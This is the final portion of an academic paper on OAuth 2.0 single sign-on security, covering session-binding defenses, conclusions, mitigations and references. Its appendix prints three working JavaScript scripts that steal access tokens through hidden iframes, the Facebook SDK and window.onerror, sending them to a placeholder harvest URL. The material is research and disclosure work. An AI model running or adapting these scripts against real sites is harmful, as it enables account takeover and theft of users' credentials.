### Sign-in Endpoints and SSL
While the use of SSL introduces additional complexity, we believe that the negative impacts are minimal. This is because there is typically only one sign-in endpoint per website, and these endpoints generally contain only server-side program logic.

### Authenticity of SSO Credentials
To ensure contextual bindings, RPs can include a value that binds the authorization request to the browser session (e.g., a hash of the session cookie) in the request via the `redirect_uri` or `state` parameter. Upon receiving an authorization response, the RP recomputes the binding value from the session cookie and checks whether the embedded binding value in the authorization response matches the newly computed value. For server-flow RPs, the binding token can be used to prevent force-login attacks by appending it to the SSO login form as a hidden field. Additionally, the binding token should be included in any HTTP request that alters the user's state on the RP website.

### Conclusion
OAuth 2.0 is appealing to RPs and straightforward for developers to implement. However, our investigation suggests that its simplicity may compromise security. Unlike conventional security protocols, OAuth 2.0 lacks robust cryptographic protections such as encryption, digital signatures, and random nonces. The absence of encryption in the protocol necessitates the use of SSL, but many evaluated websites do not follow this practice. Furthermore, the authenticity of both authorization requests and responses cannot be guaranteed without a signature. An attack that replays a compromised SSO credential is difficult to detect if the request does not include a nonce and timestamp. Additionally, client-flow support opens the protocol to various attack vectors because access tokens are passed through the browser and transmitted to the RP server. Compared to server-flow, client-flow is inherently less secure for SSO. Based on these insights, we believe that OAuth 2.0, when implemented by developers without a deep understanding of web security, is likely to result in insecure implementations.

### Mitigation Mechanisms
To protect web users in the current form of OAuth SSO systems, we suggest simple and practical mitigation mechanisms. It is urgent for current IdPs and RPs to adopt these protection mechanisms to prevent large-scale security breaches that could compromise millions of web users' accounts. Specifically, the design of server-flow is more secure than client-flow and should be the preferred option. IdPs should offer explicit flow registration and enforce single-use of authorization codes. Furthermore, JavaScript SDKs play a crucial role in the security of OAuth SSO systems, and a thorough and rigorous security examination of these libraries is an important topic for future research.

### Acknowledgments
We thank the members of the Laboratory for Education and Research in Secure Systems Engineering (LERSSE) for their valuable feedback on earlier drafts of this paper. Special thanks to Ildar Muslukhov for his significant help with result visualization and statistical analysis. Research on OAuth security analysis has been partially supported by the Canadian NSERC ISSNet Internetworked Systems Security Network Program.

### References
[1] A. Barth, J. Caballero, and D. Song. "Secure content sniffing for web browsers, or how to stop papers from reviewing themselves." In Proceedings of the 30th IEEE Symposium on Security and Privacy, SP '09, pages 360–371, Washington, DC, USA, 2009.
[2] A. Barth, C. Jackson, and J. C. Mitchell. "Robust defenses for cross-site request forgery." In Proceedings of the 15th ACM Conference on Computer and Communications Security (CCS'08), pages 75–88, New York, NY, USA, 2008. ACM.
[3] A. Barth, C. Jackson, and J. C. Mitchell. "Securing frame communication in browsers." Commun. ACM, 52(6):83–91, June 2009.
[4] J. Bau, E. Bursztein, D. Gupta, and J. Mitchell. "State of the art: Automated black-box web application vulnerability testing." In Proceedings of IEEE Symposium on Security and Privacy, 2010.
[5] Y. Boshmaf, I. Muslukhov, K. Beznosov, and M. Ripeanu. "The socialbot network: When bots socialize for fame and money." In Proceedings of the 27th Annual Computer Security Applications Conference, ACSAC '11, pages 93–102, New York, NY, USA, 2011. ACM.
[6] J. Cain. "Updated JavaScript SDK and OAuth 2.0 roadmap." https://developers.facebook.com/blog/post/525/, 2011. [Online; accessed 16-April-2012].
[7] R. Canetti. "Universally composable security: A new paradigm for cryptographic protocols." In Proceedings of Foundations of Computer Science, 2011.
[8] S. Chari, C. Jutla, and A. Roy. "Universally composable security analysis of OAuth v2.0." Cryptology ePrint Archive, Report 2011/526, 2011.
[9] C. Curtsinger, B. Livshits, B. Zorn, and C. Seifert. "ZOZZLE: Fast and precise in-browser JavaScript malware detection." In Proceedings of the 20th USENIX Conference on Security, Berkeley, CA, USA, 2011.
[10] D. L. Dill, A. J. Drexler, A. J. Hu, and C. H. Yang. "Protocol verification as a hardware design aid." In Proceedings of IEEE International Conference on Computer Design, 1992.
[11] Facebook, Inc. "Facebook authentication for websites." http://developers.facebook.com/, 2010.
[12] Facebook, Inc. "Facebook platform statistics." http://www.facebook.com/press/info.php?statistics, 2011. [Online; accessed 09-Decembe-2011].
[13] Gigya Inc. "Social media for business." http://www.gigya.com/, 2011.
[14] Google Inc. "AuthSub authentication." http://code.google.com/apis/accounts/docs/AuthSub.html, 2008.
[15] Google Inc. "The 1000 most-visited sites on the web." http://www.google.com/adplanner/static/top1000/, 2011. [Online; accessed 12-December-2011].
[16] Google, Inc. "Google OAuth 2.0." http://code.google.com/apis/accounts/docs/OAuth2Login.html, 2011.
[17] E. Hammer-Lahav. "OAuth 2.0 (without signatures) is bad for the Web." http://hueniverse.com/2010/09/oauth-2-0-without-signatures-is-bad-for-the-web/, 2010. [Online; accessed 01-April-2012].
[18] E. Hammer-Lahav, A. Barth, and B. Adida. "HTTP authentication: MAC access authentication." http://tools.ietf.org/html/draft-ietf-oauth-v2-http-mac-00, 2011.
[19] E. Hammer-Lahav, D. Recordon, and D. Hardt. "The OAuth 2.0 authorization protocol." http://tools.ietf.org/html/draft-ietf-oauth-v2-22, 2011.
[20] S. Hanna, E. C. R. Shinz, D. Akhawe, A. Boehmz, P. Saxena, and D. Song. "The Emperor’s new APIs: On the (in)secure usage of new client-side primitives." In Proceedings of the Web 2.0 Security and Privacy 2010 (W2SP), 2010.
[21] P. Hooimeijer, B. Livshits, D. Molnar, P. Saxena, and M. Veanes. "Fast and precise sanitizer analysis with BEK." In Proceedings of the 20th USENIX conference on Security, Berkeley, CA, USA, 2011. USENIX Association.
[22] D. Jackson. "Alloy 4.1." http://alloy.mit.edu/community/, 2010.
[23] M. B. Jones, D. Hardt, and D. Recordon. "The OAuth 2.0 protocol: Bearer tokens." http://tools.ietf.org/html/draft-ietf-oauth-v2-bearer-06, 2011.
[24] A. Lieuallen, A. Boodman, and J. Sundström. "Greasemonkey Firefox add-on." https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/, 2012.
[25] T. Lodderstedt, M. McGloin, and P. Hunt. "OAuth 2.0 threat model and security considerations." http://tools.ietf.org/html/draft-ietf-oauth-v2-threatmodel-01, 2011.
[26] Microsoft Inc. "Microsoft Live Connect." http://msdn.microsoft.com/en-us/windowslive/default.aspx, 2010.
[27] M. Miculan and C. Urban. "Formal analysis of Facebook Connect single sign-on authentication protocol." In Proceedings of 37th International Conference on Current Trends in Theory and Practice of Computer Science, pages 99–116, 2011.
[28] Y. Nadji, P. Saxena, and D. Song. "Document structure integrity: A robust basis for cross-site scripting defense." In Proceedings of the Network and Distributed System Security Symposium (NDSS), 2009.
[29] NIST. "National vulnerability database." http://web.nvd.nist.gov/view/vuln/statistics, 2011. [Online; accessed 16-May-2012].
[30] OSVDB. "window.onerror error handling URL destination information disclosure." http://osvdb.org/68855 (and 65042).
[31] OWASP. "Open web application security project top ten project." http://www.owasp.org/, 2010.
[32] S. Pai, Y. Sharma, S. Kumar, R. M. Pai, and S. Singh. "Formal verification of OAuth 2.0 using Alloy framework." In Proceedings of the International Conference on Communication Systems and Network Technologies (CSNT), pages 655–659, 2011.
[33] D. Recordon and B. Fitzpatrick. "OpenID authentication 2.0." http://openid.net/specs/openid-authentication-2_0.html, 2007.
[34] W. Robertson and G. Vigna. "Static enforcement of web application integrity through strong typing." In Proceedings of the 18th Conference on USENIX Security Symposium, 2009.
[35] P. Saxena, D. Molnar, and B. Livshits. "SCRIPTGUARD: Automatic context-sensitive sanitization for large-scale legacy web applications." In Proceedings of the 18th ACM Conference on Computer and Communications Security, CCS '11, pages 601–614, New York, NY, USA, 2011. ACM.
[36] L. Shepard. "Under the covers of OAuth 2.0 at Facebook." http://www.sociallipstick.com/?p=239, 2011. [Online; accessed 31-March-2012].
[37] Skybound Software. "GeckoFX: An open-source component for embedding Firefox in .NET applications." http://www.geckofx.org/, 2010.
[38] Q. Slack and R. Frostig. "OAuth 2.0 implicit grant flow analysis using Murphi." http://www.stanford.edu/class/cs259/WWW11/, 2011.
[39] A. K. Sood and R. J. Enbody. "Malvertising–exploiting web advertising." Computer Fraud & Security, 2011(4):11–16, 2011.
[40] T. Stein, E. Chen, and K. Mangla. "Facebook immune system." In Proceedings of the 4th Workshop on Social Network Systems, pages 1–8, New York, NY, USA, 2011. ACM.
[41] S.-T. Sun, Y. Boshmaf, K. Hawkey, and K. Beznosov. "A billion keys, but few locks: The crisis of Web single sign-on." In Proceedings of the New Security Paradigms Workshop (NSPW'10), pages 61–72, September 20–22, 2010.
[42] S.-T. Sun, K. Hawkey, and K. Beznosov. "Systematically breaking and fixing OpenID security: Formal analysis, semi-automated empirical evaluation, and practical countermeasures." Computers & Security, 2012.
[43] S.-T. Sun, E. Pospisil, I. Muslukhov, N. Dindar, K. Hawkey, and K. Beznosov. "What makes users refuse web single sign-on? An empirical investigation of OpenID." In Proceedings of Symposium on Usable Privacy and Security (SOUPS'11), July 2011.
[44] M. Ter Louw and V. Venkatakrishnan. "Blueprint: Precise browser-neutral prevention of cross-site scripting attacks." In Proceedings of the 30th IEEE Symposium on Security and Privacy, May 2009.
[45] W3CSchool. "Browser statistics." http://www.w3schools.com/browsers/browsers_stats.asp, 2012. [Online; accessed 16-January-2012].
[46] R. Wang, S. Chen, and X. Wang. "Signing me onto your accounts through Facebook and Google: A traffic-guided security study of commercially deployed single-sign-on web services." In Proceedings of the 33rd IEEE Symposium on Security and Privacy (accepted), 2012.
[47] WhiteHat Security. "Whitehat website security statistics report." https://www.whitehatsec.com/resource/stats.html, 2011. [Online; accessed 16-May-2012].
[48] Yahoo Inc. "Browser-Based Authentication (BBAuth)." http://developer.yahoo.com/auth/, December 2008.
[49] C. Zhang, C. Huang, K. W. Ross, D. A. Maltz, and J. Li. "In-flight modifications of content: Who are the culprits?" In Proceedings of the 4th USENIX Conference on Large-scale Exploits and Emergent Threats, LEET'11, 2011.

### Appendix

#### Access Token Theft Exploit Script 1
```javascript
// Send access token via img element
function harvest(access_token) {
    var src = '__HARVEST_URL__?access_token=' + access_token;
    var d = document;
    var img, id = 'harvest';
    img = d.createElement('img');
    img.id = id;
    img.async = true;
    img.style.display = 'none';
    img.src = src;
    d.getElementsByTagName('body')[0].appendChild(img);
}

(function(d) {
    var rp_host_name = '__RP_HOSTNAME__';
    var rp_app_id = '__RP_APPID__';

    if (top != self) { // Begin: This page is inside an iframe
        if (d.location.hash != '') {
            var url = d.location.href;
            var token = url.split('access_token=')[1];
            token = token.substring(0, token.indexOf('&'));
            harvest(token);
        }
        return; // End: This page is inside an iframe
    }

    // Begin: This page is not inside an iframe
    var redirect_uri = d.location.href;
    var iframe_src = '__AUTHZ_ENDPOINT__?client_id=' + rp_app_id + '&redirect_uri=' + redirect_uri + '&response_type=token';
    var f, id = 'iframe-hack';
    if (d.getElementById(id)) { return; }
    f = d.createElement('iframe');
    f.id = id;
    f.async = true;
    f.style.display = 'none';
    f.src = iframe_src;
    d.getElementsByTagName('body')[0].appendChild(f);
})(document);
```

#### Access Token Theft Exploit Script 2
```javascript
// Event handler when SDK is loaded
window.fbAsyncInit = function() {
    FB.init({
        appId: '__RP_APPID__',
        status: false
    });
    FB.getLoginStatus(function(response) {
        harvest(response.authResponse.accessToken);
    });
};

// Create <div id="fb-root"> dynamically
(function(d) {
    var div, id = 'fb-root';
    if (d.getElementById(id)) { return; }
    div = d.createElement('DIV');
    div.id = id;
    d.getElementsByTagName('body')[0].appendChild(div);
}(document));

// Load the SDK asynchronously
(function(d) {
    var js, id = 'facebook-jssdk';
    if (d.getElementById(id)) { return; }
    js = d.createElement('script');
    js.id = id;
    js.async = true;
    js.src = "//connect.facebook.net/en_US/all.js";
    d.getElementsByTagName('head')[0].appendChild(js);
}(document));
```

#### Access Token Theft via window.onerror
```javascript
// Setup onerror event handler
window.onerror = function (message, url, line) {
    var token = url.split('access_token=')[1];
    token = token.substring(0, token.indexOf('&'));
    harvest(token);
    return true;
}

// Prepare client-flow authorization request
var appID = '__RP_APPID__';
var redirect_url = '__RP_REDIRECT__';
var fb_oauth_url = 'https://www.facebook.com/dialog/oauth?';
var queryParams = [
    'client_id=' + appID,
    'redirect_uri=' + redirect_url,
    'response_type=token'
];
var query = queryParams.join('&');
var url = fb_oauth_url + query;

// Send authorization request via script element
(function(d) {
    var js, id = 's';
    if (d.getElementById(id)) { return; }
    js = d.createElement('script');
    js.id = id;
    js.async = true;
    js.src = url;
    d.getElementsByTagName('head')[0].appendChild(js);
}(document));
```